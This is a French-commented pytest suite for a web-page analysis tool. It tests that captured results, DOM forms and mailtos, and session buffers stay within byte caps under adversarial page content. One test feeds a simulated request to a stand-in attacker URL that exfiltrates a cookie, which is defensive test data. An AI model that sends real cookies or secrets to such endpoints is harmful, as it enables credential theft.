# SPDX-FileCopyrightText: 2026 GuatX
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Les bornes du résultat, vérifiées SUR LA STRUCTURE et non sur une liste de cas.

CE QUE CE FICHIER FERME. Trois tours de correctifs ont eu le même mode d'échec :
la garde protège ce qui a été MESURÉ, et le champ SUIVANT n'y est pas.

  - le délestage portait sur `console`/`network`/`static_findings` ; `dom.forms`
    et `dom.mailtos` — remplis DEPUIS LE CONTENU DE LA PAGE par les quatre tiers
    — n'y étaient pas. Mesuré avec `OCULAR_MAX_RESULT_JSON_BYTES=262144` (valeur
    DANS les bornes publiées) : résultat de 491 245 octets — ×1,87 le plafond —
    `truncation` à zéro, donc annoncé COMPLET, sans le moindre WARNING. Mesuré
    sur le VRAI chemin page -> extracteurs -> `build`, les extracteurs
    plafonnant à 100 éléments et tronquant chacun ;
  - le pré-élagage énumérait les mêmes champs à la main, avec le même trou ;
  - le plafond par entrée bornait CHAQUE entrée mais jamais leur SOMME : 469,0 Mio
    de texte retenu par un `NetworkCapture`, mesurés au `ru_maxrss`, pour toute la
    durée de la session interactive ;
  - et la COUPE, elle, était restée énumérée : six noms écrits dans
    `ResultBuilder.build`, si bien qu'un champ déclaré `CLIP` n'était pas coupé —
    déclaré, exécuté, jamais borné, invisible.

CE QUI EST TESTÉ ICI EST DÉRIVÉ. Les cas ne sont pas écrits un par un : ils sont
ENGENDRÉS par `engine.result.SHED_PLAN` et `CLIP_PLAN`, tous deux dérivés du
modèle — un cas par liste délestable ET un cas par champ coupable. Un champ de
volume variable ajouté demain est soit couvert par ces tests sans que personne ne
les relise, soit refusé à l'import — il n'a pas de troisième issue.
"""
import json
import types
from typing import Any, Literal, Optional, Union, get_args, get_origin

import pytest
from pydantic import BaseModel

from engine.result import (
    CLIP_PLAN,
    DEFAULT_CLIP_COUNTER,
    SHED_PLAN,
    ConsoleEntry,
    Decl,
    DomInfo,
    DynamicStep,
    NetworkEntry,
    OcularResult,
    StealthInfo,
    Truncation,
    Volume,
    _nested_models,
    _owners,
    _variable_volume,
    declaration,
    ill_shaped_declarations,
    model_tree,
    residual_paths,
    stale_declarations,
    undeclared_fields,
)
from engine.wrapper import (
    _CLIP_BUDGETS,
    _clip_result,
    _entry_bytes,
    _json_size,
    _shed_to_json_cap,
)

# Plafond de travail : petit devant les charges construites ci-dessous, pour que
# le délestage DOIVE mordre. Ce n'est pas le défaut publié — celui-là est
# éprouvé par tests/test_result_size_limits_adverse.py.
CAP = 64 * 1024
FILL = 4096          # octets nuls par élément : ×6 une fois échappé en JSON
ELEMENTS = 200


def _skeleton() -> OcularResult:
    """Résultat minimal contenant un porteur de CHAQUE famille de listes
    délestables (le DOM, un step) — sans quoi une cible imbriquée n'existerait
    pas dans l'instance et le test ne la verrait pas."""
    return OcularResult(
        job_id="job-0", profile="capture", target="https://x.test/",
        timestamp="2026-07-25T00:00:00+00:00", verdict="unknown",
        dom=DomInfo(title="t", final_url="https://x.test/"),
        dynamic_steps=[DynamicStep(action="click")],
    )


def _sample(annotation: Any, size: int) -> Any:
    """Valeur la plus LOURDE que ce type accepte, construite depuis l'annotation.
    Générique par nécessité : écrite type par type, elle raterait le champ neuf
    exactement comme la garde qu'elle est censée éprouver."""
    origin = get_origin(annotation)
    if origin in (Union, types.UnionType):
        args = [a for a in get_args(annotation) if a is not type(None)]
        return _sample(args[0], size) if args else None
    if origin is Literal:
        return get_args(annotation)[0]
    if origin in (list, set, frozenset, tuple):
        args = get_args(annotation)
        return [_sample(args[0], size)] if args else []
    if origin is dict:
        key, value = (get_args(annotation) + (str, str))[:2]
        return {_sample(key, 8): _sample(value, size)}
    if isinstance(annotation, type):
        if issubclass(annotation, BaseModel):
            return annotation(**{
                name: _sample(info.annotation, size)
                for name, info in annotation.model_fields.items() if info.is_required()
            })
        if annotation is dict:
            return {"k": "\x00" * size}
        if annotation is list:
            return ["\x00" * size]
        if annotation is bool:
            return True
        if annotation is int:
            return 1
        if annotation is float:
            return 1.0
    return "\x00" * size


def _fill(owner: BaseModel, field: str, n: int = ELEMENTS) -> None:
    element = get_args(type(owner).model_fields[field].annotation)
    value = _sample(element[0] if element else str, FILL)
    setattr(owner, field, [value for _ in range(n)])


def _ids():
    return [".".join(path) for path, _ in SHED_PLAN]


# --- 1. le délestage couvre TOUTE liste que le modèle déclare délestable ------

@pytest.mark.parametrize("index", range(len(SHED_PLAN)), ids=_ids())
def test_every_sheddable_list_of_the_model_is_actually_shed(index):
    """UN cas par liste délestable du MODÈLE. `dom.forms` et `dom.mailtos` sont
    dans le lot parce que le modèle les déclare, pas parce que quelqu'un a pensé
    à les ajouter ici — c'est exactement ce qui avait manqué.

    Le porteur est INSTANCIÉ depuis le chemin (`_materialize`), pas pris dans une
    liste indexée en parallèle de `SHED_PLAN` : quand les deux listes n'avaient
    plus la même longueur — un porteur que `shed_targets` ne savait pas
    instancier — l'échec sortait en `IndexError` qui ne nommait rien."""
    path, counter = SHED_PLAN[index]
    nom = ".".join(path)
    result = _skeleton()
    owner = _materialize(result, path[:-1])
    assert isinstance(getattr(owner, path[-1], None), list), (
        f"{nom} : déclaré délestable, mais le porteur instancié ne porte pas de "
        f"liste — le délestage ne peut pas l'atteindre"
    )
    _fill(owner, path[-1])
    assert _json_size(result) > CAP, "la charge de ce test ne dépasse plus le plafond"

    shed = _shed_to_json_cap(result, CAP)

    size = _json_size(result)
    assert size <= CAP, (
        f"{nom} : résultat de {size} octets pour un plafond de {CAP} — la masse "
        f"dictée par la page n'est pas délestée"
    )
    assert getattr(shed, counter) > 0, f"{nom} : délesté sans être compté"


def test_the_shed_names_the_field_on_its_carrier_when_it_can():
    """`DomInfo` porte `truncated_fields` : le champ délesté y est NOMMÉ, comme
    pour une coupe de texte. Un compteur global ne désigne aucun champ."""
    result = _skeleton()
    _fill(result.dom, "forms")
    _shed_to_json_cap(result, CAP)
    assert "forms" in result.dom.truncated_fields


def test_forms_and_mailtos_alone_cannot_break_the_cap():
    """Reproduction de la mesure PAR LE VRAI CHEMIN : une PAGE, ses extracteurs,
    puis `build`. Le charger à la main avec 120 éléments bruts donnait une masse
    (725 505 o. mesurés) qu'aucune page ne peut produire — les extracteurs
    plafonnent à 100 éléments et tronquent chacun. Ce que la page atteint
    RÉELLEMENT, mesuré sur 651840c avec `OCULAR_MAX_RESULT_JSON_BYTES=262144` :
    491 245 o., ×1,87 le plafond, `truncation` à zéro."""
    from engine.static import extract_forms, extract_mailtos

    # Les `\x00` sont construits HORS de la partie expression : un antislash n'y est
    # licite qu'à partir de 3.12 (PEP 701), or le plancher déclaré est 3.11 — et la
    # matrice le teste. Chaîne engendrée strictement identique (sha256 vérifié).
    bourrage_action = "\x00" * 500
    bourrage_mailto = "\x00" * 310
    page = "".join(
        f'<form action="{bourrage_action}" method="POST"></form>'
        f'<a href="mailto:{i:04d}{bourrage_mailto}">x</a>'
        for i in range(120)
    )
    result = _skeleton()
    result.dom.forms = extract_forms(page)
    result.dom.mailtos = extract_mailtos(page)
    assert len(result.dom.forms) == len(result.dom.mailtos) == 100, (
        "les plafonds d'extraction ne retiennent plus 100 de chaque : la mesure "
        "publiée en §2.10 ne décrit plus ce chemin"
    )
    assert _json_size(result) > CAP, "la charge de ce test ne dépasse plus le plafond"

    shed = _shed_to_json_cap(result, CAP)
    assert _json_size(result) <= CAP
    assert shed != Truncation(), "délestage muet : le résultat s'annonce complet"


def test_a_result_that_cannot_be_shrunk_says_by_how_much():
    """Forme NON traitée par le délestage, à dessein : la masse est dans un champ
    déclaré `KEEP` (`screenshots`, preuve image). Le résultat ne peut pas
    repasser sous le plafond — il doit le DIRE, pas s'annoncer complet."""
    from engine.result import Screenshot

    result = _skeleton()
    result.screenshots = [
        Screenshot(step=i, phase="p", image_ref="sha256:" + "0" * 64, viewport="\x00" * 4096)
        for i in range(200)
    ]
    shed = _shed_to_json_cap(result, CAP)
    assert _json_size(result) > CAP, "charge mal dimensionnée : rien à mesurer ici"
    assert shed.over_cap_bytes == _json_size(result) - CAP, (
        "résultat hors plafond annoncé complet — c'est le défaut d'origine"
    )


def test_shedding_counters_all_exist_in_the_model():
    """Un compteur nommé dans une déclaration mais absent de `Truncation` ferait
    disparaître en silence ce que le délestage retire."""
    for path, counter in SHED_PLAN:
        assert counter in Truncation.model_fields, f"{'.'.join(path)} -> {counter} inconnu"


# --- 1 bis. la COUPE couvre TOUT champ que le modèle déclare coupable ---------
#
# La nature voisine de `SHED`, et celle qui manquait : `FIELD_VOLUME` était
# parcouru pour bâtir le délestage et la doc, mais RIEN n'en dérivait l'ensemble
# des champs à couper — `ResultBuilder.build` en énumérait six à la main.
# Déclarer un septième champ `CLIP` ne faisait donc RIEN : mesuré sur 5d37457,
# un `DomInfo.meta_description` (UNE ligne de modèle + UNE de déclaration) rempli
# de 200 000 caractères par la page sortait ENTIER, `truncated_fields` vide, pour
# un résultat de 1 200 915 octets sous un plafond de 262 144 ; et sur un porteur
# délestable (`ConsoleEntry.stack`), 1 048 576 octets étaient conservés pour un
# plafond par entrée de 32 768 avec `truncation` VIDE — donc annoncé complet.

def _clip_ids():
    return [".".join(path) for path, _ in CLIP_PLAN]


def _materialize(node: BaseModel, segments: tuple[str, ...]) -> BaseModel:
    """Instancie les PORTEURS d'un chemin du plan, depuis le modèle. Sans ça, un
    chemin dont le porteur est une liste vide (`network[]`) n'existerait pas dans
    l'instance et le cas ne serait pas exercé. Générique : écrit porteur par
    porteur, il raterait le porteur neuf exactement comme la garde qu'il éprouve."""
    if not segments:
        return node
    field = segments[0]
    info = type(node).model_fields[field]
    sous = _nested_models(info.annotation)
    value = getattr(node, field)
    if sous:
        if isinstance(value, list) and not value:
            setattr(node, field, [_sample(sous[0], 8)])
        elif isinstance(value, dict) and not value:
            setattr(node, field, {"k": _sample(sous[0], 8)})
        elif value is None:
            setattr(node, field, _sample(sous[0], 8))
    porteurs = _owners(node, (field,))
    assert porteurs, f"aucun porteur instancié pour `{field}`"
    return _materialize(porteurs[0], segments[1:])


@pytest.mark.parametrize("index", range(len(CLIP_PLAN)), ids=_clip_ids())
def test_every_clippable_field_of_the_model_is_actually_clipped(index):
    """UN cas par champ COUPABLE du modèle, engendré par `CLIP_PLAN`. Un champ
    déclaré `CLIP` demain entre ici sans que personne ne relise la coupe — et
    s'il n'était pas coupé, c'est CE test-là qui le dirait, en le NOMMANT."""
    path, decl = CLIP_PLAN[index]
    nom = ".".join(path)
    result = _skeleton()
    owner = _materialize(result, path[:-1])
    annotation = type(owner).model_fields[path[-1]].annotation
    budget = _CLIP_BUDGETS[decl.budget]()
    setattr(owner, path[-1], _sample(annotation, budget * 4))
    assert _entry_bytes(getattr(owner, path[-1])) > budget, (
        f"{nom} : la charge de ce cas ne dépasse plus le budget"
    )

    cut = _clip_result(result)

    retenu = _entry_bytes(getattr(owner, path[-1]))
    assert retenu <= budget, (
        f"{nom} : {retenu} octets conservés pour un budget de {budget} — un champ "
        f"déclaré coupable et jamais coupé, c'est le défaut d'origine"
    )
    assert path[-1] in owner.truncated_fields, (
        f"{nom} : coupé sans être NOMMÉ sur son porteur"
    )
    counter = decl.counter or DEFAULT_CLIP_COUNTER
    assert cut.get(counter) == 1, f"{nom} : coupé sans être compté sous `{counter}`"


@pytest.mark.parametrize("index", range(len(CLIP_PLAN)), ids=_clip_ids())
def test_the_builder_itself_clips_every_declared_field(index):
    """La même propriété EN BOUT DE CHAÎNE : par `ResultBuilder.build`, le chemin
    de production. Les porteurs que `build` remplit lui-même sont dérivés du plan,
    pas énumérés ; ceux qu'il ne remplit pas sont couverts par le filet de bout de
    chaîne, et ce test le vérifie aussi (le résultat sort de `build` dans tous les
    cas)."""
    from engine.wrapper import ResultBuilder

    path, decl = CLIP_PLAN[index]
    budget = _CLIP_BUDGETS[decl.budget]()
    porteur, champ = path[:-1], path[-1]
    kwargs: dict[str, Any] = {
        "job_id": "j", "profile": "capture", "target": "https://x.test/",
        "input_hash": None, "verdict": "unknown",
    }
    # Le porteur est choisi par le CHEMIN, pas par un nom écrit ici : `build`
    # reçoit les entrées sous forme de dicts, le DOM sous forme de modèle.
    modele = {"network": NetworkEntry, "console": ConsoleEntry, "dom": DomInfo}
    if porteur and porteur[0] in modele:
        cls = modele[porteur[0]]
        annotation = cls.model_fields[champ].annotation
        gros = _sample(annotation, budget * 4)
        if porteur[0] == "dom":
            kwargs["dom_info"] = DomInfo(**{champ: gros})
        else:
            requis = {n: _sample(i.annotation, 8)
                      for n, i in cls.model_fields.items() if i.is_required()}
            kwargs[porteur[0]] = [{**requis, champ: gros}]
    else:  # pragma: no cover - aucun chemin de ce genre aujourd'hui
        pytest.skip(f"{'.'.join(path)} : porteur non alimentable par `build`")

    result, _ = ResultBuilder().build(**kwargs)

    owner = _owners(result, porteur)[0]
    retenu = _entry_bytes(getattr(owner, champ))
    assert retenu <= budget, (
        f"{'.'.join(path)} : {retenu} octets dans le résultat BÂTI pour un budget "
        f"de {budget}"
    )
    assert champ in owner.truncated_fields
    counter = decl.counter or DEFAULT_CLIP_COUNTER
    assert getattr(result.truncation, counter) >= 1, (
        f"{'.'.join(path)} : coupé sans que `{counter}` ne le dise"
    )


def test_clipping_counters_all_exist_in_the_model():
    for path, decl in CLIP_PLAN:
        counter = decl.counter or DEFAULT_CLIP_COUNTER
        assert counter in Truncation.model_fields, f"{'.'.join(path)} -> {counter}"


def test_a_clip_field_that_names_no_budget_is_still_cut():
    """LE GESTE MINIMAL : une ligne de modèle, une ligne de déclaration
    (`Decl(CLIP)`), rien d'autre. Le champ doit être coupé au budget par DÉFAUT —
    sans quoi « déclarer suffit » redevient faux pour le prochain champ. Le
    porteur est fabriqué ici parce que le modèle réel n'a, aujourd'hui, aucun
    champ dans ce cas : la garde doit être vraie AVANT qu'il en existe un."""
    from engine.wrapper import _clip_field

    defaut = _CLIP_BUDGETS[""]()
    assert 0 < defaut <= 64 * 1024, (
        f"budget par défaut de {defaut} octets : hors de l'échelle des budgets "
        f"calibrés (et de la borne haute du module)"
    )
    porteur = DomInfo()
    porteur.title = "\x00" * (defaut * 4)
    assert _clip_field(porteur, "title", defaut) is True
    assert len(porteur.title.encode("utf-8")) <= defaut
    assert porteur.truncated_fields == ["title"]


def test_owners_reaches_carriers_held_in_a_mapping():
    """`_owners` ne descendait que les listes : un porteur vivant dans un
    `dict[str, Modèle]` était CONNU du plan et jamais instancié, donc ni délesté
    ni coupé — et l'échec sortait en `IndexError`. Fabriqué ici pour la même
    raison que ci-dessus : la garde doit être vraie avant le champ."""
    class _Cadre(BaseModel):
        pages: dict[str, DomInfo] = {}

    cadre = _Cadre(pages={"a": DomInfo(title="x"), "b": DomInfo(title="y")})
    atteints = _owners(cadre, ("pages",))
    assert [d.title for d in atteints] == ["x", "y"]


def test_every_declared_clip_budget_is_implemented():
    """Un champ déclaré coupable sur un budget que `engine.wrapper` n'implémente
    pas ne serait jamais coupé. L'import le refuse ; ce test le dit."""
    for path, decl in CLIP_PLAN:
        assert decl.budget in _CLIP_BUDGETS, (
            f"{'.'.join(path)} : budget `{decl.budget}` inconnu de engine.wrapper"
        )
        assert _CLIP_BUDGETS[decl.budget]() > 0


@pytest.mark.parametrize("cls_name,champ,annotation,decl,motif", [
    ("_Neuf", "frames", dict[str, DomInfo], Decl(Volume.SHED, "other_dropped"),
     "déclaré SHED mais n'est pas une list"),
    ("_Neuf", "beacons", list[str], Decl(Volume.CLIP), "déclaré CLIP mais n'est ni une"),
])
def test_a_declaration_the_guard_cannot_apply_is_refused(cls_name, champ, annotation, decl, motif):
    """LA MUTATION, jouée dans la suite : une déclaration JUSTE en apparence mais
    que la garde ne sait pas appliquer à la FORME du champ serait INERTE — donc
    le champ non borné, exactement comme `Decl(CLIP)` l'était pour tous les
    champs. Elle doit être refusée à l'import, en NOMMANT le champ."""
    from engine.result import FIELD_VOLUME

    class _Neuf(DomInfo):
        pass

    _Neuf.model_fields[champ] = type(DomInfo.model_fields["title"])(annotation=annotation)
    FIELD_VOLUME[f"{cls_name}.{champ}"] = decl
    try:
        faux = ill_shaped_declarations({cls_name: _Neuf})
    finally:
        FIELD_VOLUME.pop(f"{cls_name}.{champ}")
    assert len(faux) == 1 and champ in faux[0] and motif in faux[0], faux


def test_a_clip_declared_on_a_carrier_that_cannot_name_it_is_refused():
    """Un champ coupé sur un porteur sans `truncated_fields` serait coupé MUET au
    niveau de l'entrée — le défaut que tests/test_entry_truncation_markers.py
    ferme. La déclaration est donc refusée, pas tolérée."""
    from engine.result import FIELD_VOLUME

    FIELD_VOLUME["StealthInfo.challenge"] = Decl(Volume.CLIP)
    try:
        faux = ill_shaped_declarations({"StealthInfo": StealthInfo})
    finally:
        FIELD_VOLUME["StealthInfo.challenge"] = Decl(Volume.RESIDUAL)
    assert len(faux) == 1 and "TruncatableEntry" in faux[0], faux


def test_the_model_has_no_ill_shaped_declaration():
    assert ill_shaped_declarations() == []


# --- 2. impossible d'ajouter un champ sans déclarer sa nature ----------------

def test_the_model_is_entirely_declared():
    assert undeclared_fields() == []
    assert stale_declarations() == []


def test_an_undeclared_variable_volume_field_is_flagged():
    """La MUTATION, jouée dans la suite : une sous-classe qui ajoute une liste
    sans déclaration doit être signalée. Sur le vrai modèle, ce signalement est
    une exception à l'import — donc la suite entière échoue."""
    class _DomNeuf(DomInfo):
        exfiltrations: list[str] = []

    manquants = undeclared_fields({"_DomNeuf": _DomNeuf})
    assert manquants == ["_DomNeuf.exfiltrations"]


@pytest.mark.parametrize("annotation", [
    list[str], dict[str, str], set[str], frozenset[str], tuple[str, ...],
    str, Optional[str], list[dict[str, list[str]]], bytes, Any,
    Union[str, int], list["DynamicStep"],
])
def test_unbounded_shapes_require_a_declaration(annotation):
    """Formes NON traitées explicitement par la garde (`frozenset`, `tuple`,
    `Any`, `bytes`, une union mixte, un dict de listes) : toutes doivent tomber
    du côté « déclare-toi », parce que l'inconnu s'y traite comme du variable."""
    assert _variable_volume(annotation) is True


@pytest.mark.parametrize("annotation", [
    int, bool, float, Optional[int], Literal["a", "b"], Optional[Literal["a"]],
    DomInfo, Optional[DomInfo],
])
def test_bounded_shapes_need_no_declaration(annotation):
    """Symétrique : ce que le TYPE borne déjà (entiers, booléens, littéraux) ou
    ce qui est descendu comme sous-arbre (un modèle) n'exige pas de déclaration."""
    assert _variable_volume(annotation) is False


def test_every_declared_field_has_a_known_volume():
    for name, cls in model_tree().items():
        for field, info in cls.model_fields.items():
            decl = declaration(cls, field)
            if decl is not None:
                assert isinstance(decl.volume, Volume), f"{name}.{field}"


# --- 3. la doc ne peut plus diverger du modèle ------------------------------

def test_the_published_residual_list_matches_the_model():
    """§2.10 « Ce qui n'est PAS garanti » énumérait `redirect_chain`, `links`,
    `challenge` — et omettait `forms` et `mailtos`. La liste publiée est
    maintenant DÉRIVÉE ; ce test échoue si le fichier et le modèle divergent."""
    import re
    from pathlib import Path

    doc = Path("docs/DEPLOY-SECURITY.md").read_text(encoding="utf-8").splitlines()
    marqueur = [i for i, line in enumerate(doc) if line.startswith("<!-- residual-paths:")]
    assert len(marqueur) == 1, "marqueur de la liste dérivée absent ou dupliqué dans §2.10"
    publie = set(re.findall(r"`([^`]+)`", doc[marqueur[0] + 1]))
    assert publie == set(residual_paths()), (
        f"§2.10 publie {sorted(publie)} ; le modèle dérive {residual_paths()}"
    )


# --- 4. budget CUMULÉ du tampon de session ----------------------------------

class _Req:
    def __init__(self, url: str, post_data=None) -> None:
        self.url, self.method, self.resource_type, self.post_data = url, "POST", "xhr", post_data


class _Msg:
    def __init__(self, text: str) -> None:
        self.type, self.text = "log", text


def _wire(keep: str = "last"):
    from engine.wrapper import NetworkCapture

    cap, hooks = NetworkCapture(keep=keep), {}

    class _Page:
        def on(self, event, fn):
            hooks[event] = fn

    cap.attach(_Page())
    return cap, hooks


@pytest.mark.parametrize("keep", ["first", "last"])
def test_the_session_buffer_is_bounded_in_bytes_not_only_in_entries(monkeypatch, keep):
    """Le plafond de CARDINALITÉ laissait la page retenir
    `entrées × plafond par entrée` d'octets pour toute la session : 468,8 Mio
    mesurés au `ru_maxrss` aux plafonds publiés. Le budget cumulé borne la
    SOMME, dans les deux modes de survie."""
    monkeypatch.setenv("OCULAR_MAX_CAPTURE_BUFFER_BYTES", str(1024 * 1024))
    cap, hooks = _wire(keep)
    for i in range(500):
        hooks["request"](_Req("https://e.test/" + "u" * 20000))
        hooks["console"](_Msg("c" * 20000))
    for bucket in ("network", "console"):
        retenu = cap.retained_bytes(bucket)
        assert retenu <= 1024 * 1024, f"{bucket} : {retenu} octets retenus"
    assert cap.dropped_network > 0 and cap.dropped_console > 0, (
        "des entrées ont été refusées sans être comptées"
    )
    assert cap.truncation().network_dropped == cap.dropped_network


def test_the_newest_evidence_survives_in_the_interactive_tier(monkeypatch):
    """`keep="last"` : l'analyste pilote la page pour DÉCLENCHER l'exfiltration,
    donc c'est la requête tardive qu'il faut garder quand le budget mord."""
    monkeypatch.setenv("OCULAR_MAX_CAPTURE_BUFFER_BYTES", str(256 * 1024))
    cap, hooks = _wire("last")
    for i in range(200):
        hooks["request"](_Req("https://benin.test/" + "u" * 20000))
    hooks["request"](_Req("https://evil.test/exfil?cookie=SECRET"))
    assert cap.network[-1]["url"] == "https://evil.test/exfil?cookie=SECRET"
    assert cap.dropped_network > 0


def test_the_first_entries_survive_in_the_batch_tier(monkeypatch):
    monkeypatch.setenv("OCULAR_MAX_CAPTURE_BUFFER_BYTES", str(256 * 1024))
    cap, hooks = _wire("first")
    hooks["request"](_Req("https://site.test/premier.js"))
    for i in range(200):
        hooks["request"](_Req("https://site.test/" + "u" * 20000))
    assert cap.network[0]["url"] == "https://site.test/premier.js"
    assert cap.dropped_network > 0


def test_an_entry_heavier_than_the_whole_budget_is_refused_not_admitted(monkeypatch):
    """Forme non traitée explicitement : une SEULE entrée plus lourde que le
    budget entier. L'admettre violerait le budget qu'on vient de poser."""
    monkeypatch.setenv("OCULAR_MAX_CAPTURE_BUFFER_BYTES", "1024")
    cap, hooks = _wire("last")
    hooks["console"](_Msg("c" * 20000))
    assert cap.retained_bytes("console") <= 1024
    assert cap.dropped_console == 1


def test_entries_appended_by_the_runner_itself_are_counted(monkeypatch):
    """Forme non traitée explicitement : les runners ajoutent leurs propres
    messages directement dans `capture.console` (`runner_analysis/render.py`,
    `runner_recon/capture.py`), hors du point d'insertion. La comptabilité doit
    se re-dériver, sinon le budget compte faux et ne borne plus rien."""
    monkeypatch.setenv("OCULAR_MAX_CAPTURE_BUFFER_BYTES", str(64 * 1024))
    cap, hooks = _wire("last")
    cap.console.append({"level": "error", "text": "x" * 60000})
    hooks["console"](_Msg("y" * 20000))
    assert cap.retained_bytes("console") <= 64 * 1024


@pytest.mark.parametrize("requetes,total", [(87, 6205374), (50, 1630)])
def test_a_real_page_profile_is_not_touched_by_the_cumulative_budget(requetes, total):
    """NON-RÉGRESSION sur du contenu RÉEL. Profils mesurés sur le sous-ensemble
    REQUÊTE de 24 009 fichiers HTML réels (src/srcset/poster/data, `<link href>`,
    action de formulaire — un `<a href>` est une navigation, pas une requête) :
    la page la plus lourde du corpus (87 requêtes, 6 205 374 o. — des URI `data:`
    de `KeePassXC_UserGuide.html`) et le profil p99,9 (50 requêtes, 1 630 o.).
    Au défaut publié, aucune entrée ne doit sortir du tampon."""
    cap, hooks = _wire("last")
    taille = total // requetes
    for i in range(requetes):
        hooks["request"](_Req("https://reel.test/" + "u" * max(1, taille - 18)))
    assert cap.dropped_network == 0, (
        f"{cap.dropped_network} entrées perdues sur un profil de page RÉEL "
        f"({requetes} requêtes, {total} octets)"
    )
    assert cap.retained_bytes("network") <= 33554432


# --- 5. la paire /capture est corrigée sur TOUS ses termes -------------------

def test_an_impossible_capture_configuration_is_corrected_on_every_term(monkeypatch):
    """`OCULAR_MAX_INTERNAL_CAPTURE_BYTES=64 Mio` (valeur DANS les bornes) : la
    part des blobs (85,3 Mio) dépasse à elle seule la lecture. Corriger la seule
    source donnait un budget de 1 OCTET en se déclarant satisfait, et `/capture`
    restait en 502 permanent."""
    from engine.limits import PAIRS, resolve

    monkeypatch.setenv("OCULAR_MAX_INTERNAL_CAPTURE_BYTES", str(64 * 1024 * 1024))
    budget = resolve("capture")
    assert budget.clamped is True
    assert budget.source >= PAIRS["capture"].source_floor, (
        f"budget de source de {budget.source} octets : inatteignable, donc 502 permanent"
    )
    assert budget.artifact_cap > 0
    assert budget.source + budget.reserved <= budget.read_cap
    assert budget.headroom >= 0


def test_the_corrected_configuration_actually_answers(monkeypatch):
    """La preuve que la correction rétablit la fonction : le payload complet
    (résultat + blobs) tient sous le plafond de lecture, charges adverses
    comprises."""
    import os

    from engine.limits import resolve
    from engine.wrapper import ResultBuilder, _max_artifact_bytes, wrapper_payload

    monkeypatch.setenv("OCULAR_MAX_INTERNAL_CAPTURE_BYTES", str(64 * 1024 * 1024))
    art = _max_artifact_bytes()
    builder = ResultBuilder()
    builder.add_screenshot(0, "initial", b"\x89PNG" + os.urandom(art - 4))
    builder.set_dom(b"<html>" + os.urandom(2 * art))
    result, blobs = builder.build(
        job_id="j", profile="capture", target="https://x.test/", input_hash=None,
        verdict="unknown",
        console=[{"level": "log", "text": "\x00" * 32768} for _ in range(200)],
    )
    payload = len(json.dumps(wrapper_payload(result, blobs)))
    assert payload <= resolve("capture").read_cap, (
        f"payload de {payload} octets : `/capture` refusé -> 502 permanent"
    )


def test_the_source_floor_stays_above_the_socle_it_protects():
    """Le plancher n'a de sens que s'il laisse passer le socle NON dicté par la
    page (identité du job, réfs de blobs, triage) : on le MESURE ici plutôt que
    de croire le chiffre écrit à côté."""
    from engine.limits import PAIRS
    from engine.wrapper import ResultBuilder

    socle, _ = ResultBuilder().build(
        job_id="job-0123456789abcdef", profile="capture",
        target="https://exemple.test/" + "p" * 80, input_hash="sha256:" + "0" * 64,
        verdict="malicious",
    )
    mesure = _json_size(socle)
    assert PAIRS["capture"].source_floor > mesure, (
        f"plancher {PAIRS['capture'].source_floor} sous le socle mesuré {mesure}"
    )


def test_the_capture_read_cap_cannot_be_set_below_what_a_response_costs(monkeypatch):
    """Un plafond de lecture sous le plancher de la source est un 502 permanent
    déguisé en configuration : il est ramené, et journalisé."""
    from engine.limits import PAIRS, resolve

    monkeypatch.setenv("OCULAR_MAX_INTERNAL_CAPTURE_BYTES", "1024")
    budget = resolve("capture")
    assert budget.read_cap >= PAIRS["capture"].source_floor
